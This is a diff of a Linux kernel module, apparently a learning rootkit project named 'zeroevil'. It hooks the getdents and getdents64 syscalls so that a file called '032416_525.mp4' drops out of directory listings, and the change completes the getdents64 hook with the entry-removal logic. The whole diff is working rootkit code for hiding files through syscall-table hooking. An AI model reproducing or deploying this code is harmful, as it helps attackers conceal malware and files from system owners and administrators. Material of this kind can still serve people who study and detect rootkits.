@@ -21,7 +21,8 @@
 
 # include <linux/module.h>
 # include <linux/kernel.h>
-# include <linux/dirent.h> // linux_dirent64.
+// linux_dirent64.
+# include <linux/dirent.h>
 # include <linux/syscalls.h>
 
 # include "zeroevil/zeroevil.h"
@@ -31,8 +32,7 @@ MODULE_LICENSE("GPL");
 
 # define SECRET_FILE "032416_525.mp4"
 
-
-asmlinkage unsigned long **sct;
+unsigned long **sct;
 
 asmlinkage long
 (*real_getdents)(unsigned int fd,
@@ -93,15 +93,15 @@ fake_getdents(unsigned int fd,
 
     ret = real_getdents(fd, dirent, count);
 
-    print_dirent(dirent, ret);
-    ret = remove_dirent_entry(SECRET_FILE, dirent, ret);
-    print_dirent(dirent, ret);
+    print_dents(dirent, ret);
+    ret = remove_dent(SECRET_FILE, dirent, ret);
+    print_dents(dirent, ret);
 
     return ret;
 }
 
 
-// TODO: Find triggering cases. This was not called in my test.
+// INFO: It was triggered on a Kali i686-pae installation.
 asmlinkage long
 fake_getdents64(unsigned int fd,
                 struct linux_dirent64 __user *dirent,
@@ -109,11 +109,11 @@ fake_getdents64(unsigned int fd,
 {
     long ret;
 
-    fm_alert("==> %s\n", __func__);
-
     ret = real_getdents64(fd, dirent, count);
 
-    // TODO: Add hooking logic.
+    print_dents64(dirent, ret);
+    ret = remove_dent64(SECRET_FILE, dirent, ret);
+    print_dents64(dirent, ret);
 
     return ret;
 }
